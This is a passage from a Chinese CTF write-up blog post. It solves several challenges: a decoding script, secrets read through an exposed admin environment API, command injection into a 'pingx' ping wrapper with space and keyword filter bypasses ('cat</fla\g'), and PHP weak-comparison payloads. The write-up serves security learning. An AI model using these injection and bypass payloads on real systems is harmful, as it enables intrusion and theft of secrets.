class="hljs-string">&#x27;Y&#x27;</span>: <span class="hljs-string">&#x27;+[+[]!]&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>: <span class="hljs-string">&#x27;+[+[]+]&#x27;</span>,<br>    <span class="hljs-string">&#x27;&#123;&#x27;</span>: <span class="hljs-string">&#x27;([![]!])&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>: <span class="hljs-string">&#x27;([![]+])&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>: <span class="hljs-string">&#x27;([!()!])&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>: <span class="hljs-string">&#x27;([!()+])&#x27;</span>,<br>    <span class="hljs-string">&#x27;=&#x27;</span>: <span class="hljs-string">&#x27;([+[]!])&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>: <span class="hljs-string">&#x27;([+[]+])&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>: <span class="hljs-string">&#x27;([+()!])&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>: <span class="hljs-string">&#x27;([+()+])&#x27;</span>,<br>    <span class="hljs-string">&#x27;!&#x27;</span>: <span class="hljs-string">&#x27;![![]![]]&#x27;</span>, <span class="hljs-string">&#x27;@&#x27;</span>: <span class="hljs-string">&#x27;![![]!()]&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>: <span class="hljs-string">&#x27;![![]+[]]&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>: <span class="hljs-string">&#x27;![![]+()]&#x27;</span>,<br>    <span class="hljs-string">&#x27;%&#x27;</span>: <span class="hljs-string">&#x27;![!()![]]&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>: <span class="hljs-string">&#x27;![!()!()]&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>: <span class="hljs-string">&#x27;![!()+[]]&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>: <span class="hljs-string">&#x27;![!()+()]&#x27;</span>,<br>    <span class="hljs-string">&#x27;)&#x27;</span>: <span class="hljs-string">&#x27;![+[]![]]&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>: <span class="hljs-string">&#x27;![+[]!()]&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>: <span class="hljs-string">&#x27;![+[]+[]]&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>: <span class="hljs-string">&#x27;![+[]+()]&#x27;</span>,<br>    <span class="hljs-string">&#x27;:&#x27;</span>: <span class="hljs-string">&#x27;![+()![]]&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>: <span class="hljs-string">&#x27;![+()!()]&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>: <span class="hljs-string">&#x27;![+()+[]]&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>: <span class="hljs-string">&#x27;![+()+()]&#x27;</span>,<br>    <span class="hljs-string">&#x27;.&#x27;</span>: <span class="hljs-string">&#x27;+[![]![]]&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>: <span class="hljs-string">&#x27;+[![]!()]&#x27;</span>, <span class="hljs-string">&#x27;&lt;&#x27;</span>: <span class="hljs-string">&#x27;+[![]+[]]&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>: <span class="hljs-string">&#x27;+[![]+()]&#x27;</span>,<br>    <span class="hljs-string">&#x27;|&#x27;</span>: <span class="hljs-string">&#x27;+[!()![]]&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>: <span class="hljs-string">&#x27;+[!()!()]&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>: <span class="hljs-string">&#x27;+[!()+[]]&#x27;</span>, <span class="hljs-string">&#x27;~&#x27;</span>: <span class="hljs-string">&#x27;+[!()+()]&#x27;</span><br>&#125;<br><br><span class="hljs-comment"># 2. 构建 DECODE_MAP</span><br>DECODE_MAP = &#123;v: k <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> ENCODE_MAP.items()&#125;<br><br><span class="hljs-comment"># 3. 来自第一段源码的 ENCODED_FLAG</span><br>ENCODED_FLAG = <span class="hljs-string">&#x27;0x50, 0x4b, 0x57, 0x43, 0x54, 0x46, 0x7b, 0x34, 0x39, 0x66, 0x31, 0x65, 0x31, 0x39, 0x61, 0x2d, 0x61, 0x39, 0x36, 0x66, 0x2d, 0x34, 0x64, 0x62, 0x61, 0x2d, 0x38, 0x64, 0x37, 0x61, 0x2d, 0x62, 0x37, 0x62, 0x37, 0x64, 0x32, 0x63, 0x61, 0x63, 0x31, 0x32, 0x32, 0x7d&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jsfuck_decode</span>(<span class="hljs-params">encoded: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;对应 JS 里的 window.__Jsfuck.decode&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(DECODE_MAP.get(tok, <span class="hljs-string">&#x27;?&#x27;</span>) <span class="hljs-keyword">for</span> tok <span class="hljs-keyword">in</span> encoded.split())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hex_to_str</span>(<span class="hljs-params">hex_str: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Hex 字符串转普通字符串&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>.fromhex(hex_str).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># Step 1: 去 0x 并拼接 Hex</span><br>    hex_str = <span class="hljs-string">&#x27;&#x27;</span>.join(x.strip().replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ENCODED_FLAG.split(<span class="hljs-string">&#x27;,&#x27;</span>))<br>    <br>    <span class="hljs-comment"># Step 2: Hex -&gt; 原始字符串（其实就是 Flag 的 Hex 编码形式）</span><br>    raw_str = hex_to_str(hex_str)<br>    <br>    <span class="hljs-comment"># Step 3: 用 __Jsfuck.decode 解码</span><br>    flag = jsfuck_decode(<span class="hljs-string">&#x27; &#x27;</span>.join(raw_str))<br>    <br><br>    <span class="hljs-keyword">if</span> flag.startswith(<span class="hljs-string">&#x27;?&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(flag) &lt; <span class="hljs-number">10</span>:<br>        flag = raw_str<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Decrypted Flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921191624539.png" srcset="/img/loading.gif" lazyload alt="image-20260921191624539"></p>
+<h2 id="PKW学院"><a href="#PKW学院" class="headerlink" title="PKW学院"></a>PKW学院</h2><p>首页是一个学校的官网（但一眼就是AI写的，发现有效的板块只有几个，其中一个就是学生端登录，一直在提示新生的密码是身份证后六位，那就信息收集，先看一眼爬虫协议</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921192037442.png" srcset="/img/loading.gif" lazyload alt="image-20260921192037442"></p>
+<p>确实有一些路径但是没什么用</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921192206772.png" srcset="/img/loading.gif" lazyload alt="image-20260921192206772"></p>
+<p>那就看首页源码，可以看到给了api路径</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921193819525.png" srcset="/img/loading.gif" lazyload alt="image-20260921193819525"></p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921193844012.png" srcset="/img/loading.gif" lazyload alt="image-20260921193844012"></p>
+<p>有以下几个可能有用的api接口</p>
+<p><strong>任意环境变量读取</strong>，典型的 RCE &#x2F; 信息泄露前置漏洞</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span> /api/v1/admin/env?<span class="hljs-attribute">name</span>=xxx<br></code></pre></td></tr></table></figure>
+
+<p><strong>任意日志读取</strong>，可泄露 Token、Session、SQL 语句</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">GET <span class="hljs-regexp">/api/</span>v1<span class="hljs-regexp">/admin/</span>logs<br></code></pre></td></tr></table></figure>
+
+<p><strong>系统信息泄露</strong>，暴露控制台配置</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GET</span> /api/v1/<span class="hljs-keyword">system</span>/<span class="hljs-keyword">info</span><br></code></pre></td></tr></table></figure>
+
+<p>首先就是访问<code>/api/v1/admin/env?name=</code>看到返回提示了<code>?name=APP_SECRET</code></p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921194529314.png" srcset="/img/loading.gif" lazyload alt="image-20260921194529314"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/api/</span>v1<span class="hljs-regexp">/admin/</span>env?name=APP_SECRET<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921194655510.png" srcset="/img/loading.gif" lazyload alt="image-20260921194655510"></p>
+<p>base64解码得到</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921194745102.png" srcset="/img/loading.gif" lazyload alt="image-20260921194745102"></p>
+<h2 id="Linux之旅"><a href="#Linux之旅" class="headerlink" title="Linux之旅"></a>Linux之旅</h2><p>文章最下面有一个<code>setup(8)</code>可以点击</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921194838829.png" srcset="/img/loading.gif" lazyload alt="image-20260921194838829"></p>
+<p>点击之后就是一个模拟虚拟机安装，一直点继续就行，然后用户名随便填，我填的admin&#x2F;admin，这个无所谓</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921195015042.png" srcset="/img/loading.gif" lazyload alt="image-20260921195015042"></p>
+<p>到这一步之后就点击“重启进入系统”，然后用刚刚注册的账号密码登录</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921195113452.png" srcset="/img/loading.gif" lazyload alt="image-20260921195113452"></p>
+<p>先利用<code>ls</code>命令查看文件</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921195816024.png" srcset="/img/loading.gif" lazyload alt="image-20260921195816024"></p>
+<p>发现有两个文件，读取一下</p>
+<p>notes.txt文件中有提示</p>
+<ul>
+<li><p>可以利用<code>/usr/local/bin/pingx</code></p>
+</li>
+<li><p>只有root身份才可以读取flag</p>
+</li>
+</ul>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921195905417.png" srcset="/img/loading.gif" lazyload alt="image-20260921195905417"></p>
+<p>可以看一下<code>/usr/local/bin/pingx</code>有什么用</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>pingx -h<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921200048299.png" srcset="/img/loading.gif" lazyload alt="image-20260921200048299"></p>
+<p>这些有点眼熟，是ping的标准帮助信息，所以<code>/usr/local/bin/pingx</code>就相当于<code>ping</code>命令，那就很容易想到尝试命令注入，发现是行的通的，而且已经是root身份了</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>pingx <span class="hljs-string">&quot;127.0.0.1;whoami&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921200258843.png" srcset="/img/loading.gif" lazyload alt="image-20260921200258843"></p>
+<p>那就可以直接利用这个来读flag</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>pingx <span class="hljs-string">&quot;127.0.0.1;cat /flag&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921200415066.png" srcset="/img/loading.gif" lazyload alt="image-20260921200415066"></p>
+<p>发现空格被过滤，一开始想用<code>$&#123;IFS&#125;</code>绕过的，但是也被过滤了，那就换一种绕过方式</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>pingx <span class="hljs-string">&quot;127.0.0.1;cat&lt;/flag&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921200534980.png" srcset="/img/loading.gif" lazyload alt="image-20260921200534980"></p>
+<p>flag关键字又被过滤了，先想到的是用通配符绕过，但应该也不可以，就用转义符</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>pingx <span class="hljs-string">&quot;127.0.0.1;cat&lt;/fla\g&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921200655600.png" srcset="/img/loading.gif" lazyload alt="image-20260921200655600"></p>
+<h2 id="小虎鲸大冒险"><a href="#小虎鲸大冒险" class="headerlink" title="小虎鲸大冒险"></a>小虎鲸大冒险</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$pass1</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;ticket&quot;</span>])<br>    &amp;&amp; <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;ticket&quot;</span>])<br>    &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;ticket&quot;</span>] !== <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$pass2</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;depth&quot;</span>])<br>    &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;depth&quot;</span>]) &lt;= <span class="hljs-number">4</span><br>    &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;depth&quot;</span>] &gt; <span class="hljs-number">1000</span>;<br><br><span class="hljs-variable">$pass3</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;song&quot;</span>])<br>    &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;song&quot;</span>]) == <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$pass1</span> &amp;&amp; <span class="hljs-variable">$pass2</span> &amp;&amp; <span class="hljs-variable">$pass3</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;小虎鲸成功回家！&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;小虎鲸还没有通过三关。&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>isset</code>函数就是来判断参数是否存在的，参数存在时返回为true</p>
+<p><code>empty</code>函数用于检查一个变量是否为空，会返回true的情况：””、0、”0”、null、false、未定义变量</p>
+<p><code>strlen</code>计算字符串长度的函数，这里要求小于4但是值又要大于1000，就用科学计数法绕过</p>
+<p><code>md5($_POST[&quot;song&quot;]) == 0</code>md5弱比较</p>
+<p>payload</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ticket</span>=0&amp;depth=3e12<br><span class="hljs-attribute">song</span>=s878926199a<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260922122448275.png" srcset="/img/loading.gif" lazyload alt="image-20260922122448275"></p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="De-Fusion"><a href="#De-Fusion" class="headerlink" title="De-Fusion"></a>De-Fusion</h2><p>将解压缩的图片放到010中看到里面有一个<code>flag2.png</code>，</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921201856307.png" srcset="/img/loading.gif" lazyload alt="image-20260921201856307"></p>
+<p>搜索一下压缩包的十六进制头<code>50 4B 03 04</code>，发现存在压缩包</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921202023573.png" srcset="/img/loading.gif" lazyload alt="image-20260921202023573"></p>
+<p>直接把图片的后缀名改成.zip</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921202121880.png" srcset="/img/loading.gif" lazyload alt="image-20260921202121880"></p>
+<p>里面存在flag2.png</p>
+<p><img src="/2026/09/20/PKWCTF2026-WP/image-20260921202223042.png" srcset="/img/loading.gif" lazyload alt="image-20260921202223042"></p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">_K4I31d0_H34rt</span>&#125;<br><span class="hljs-variable">_K4l31d0_H34rt</span>&#125;<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" class="print-no-link">#比赛复现</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>PKWCTF2026-WP</div>
+      <div>https://colourful228.github.io/2026/09/20/PKWCTF2026-WP/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Colourful</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年9月20日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2026年9月22日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/09/17/RCELabs/" title="RCELabs">
+                        <span class="hidden-mobile">RCELabs</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"Colourful228/Blog_Disscussion","repo-id":"R_kgDOS4dBxQ","category":"Announcements","category-id":"DIC_kwDOS4dBxc4C_AjU","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":1,"emit-metadata":0,"input-position":"bottom","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+    <div>
+        <span id="timeDate">正在载入天数...</span>
+        <span id="times">载入时分秒...</span>
+        <script>
+          var now = new Date();
+          function createtime(){
+            var grt= new Date("01/09/2026 00:00:00");
+            now.setTime(now.getTime()+250);
+            days = (now - grt ) / 1000 / 60 / 60 / 24;
+            dnum = Math.floor(days);
+            hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+            hnum = Math.floor(hours);
+            if(String(hnum).length ==1 ){
+              hnum = "0" + hnum;
+            }
+            minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+            mnum = Math.floor(minutes);
+            if(String(mnum).length ==1 ){
+              mnum = "0" + mnum;
+            }
+            seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+            snum = Math.round(seconds);
+            if(String(snum).length ==1 ){
+              snum = "0" + snum;
+            }
+            document.getElementById("timeDate").innerHTML = "🚀已持续航行&nbsp"+dnum+"&nbsp天";
+            document.getElementById("times").innerHTML = hnum + "&nbsp时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+          }
+          setInterval("createtime()",250);
+        </script>
+    </div>
+
+
+
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  var relativeDate = function() {
+    var updatedTime = document.getElementById('updated-time');
+    if (updatedTime) {
+      var text = updatedTime.textContent;
+      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
+      var matchs = text.match(reg);
+      if (matchs) {
+        var relativeTime = moment(matchs[0]).fromNow();
+        updatedTime.textContent = text.replace(reg, relativeTime);
+      }
+      updatedTime.style.display = '';
+    }
+  };
+  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
+    if (!'zh-cn'.startsWith('en')) {
+      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
+        relativeDate();
+      });
+    } else {
+      relativeDate();
+    }
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
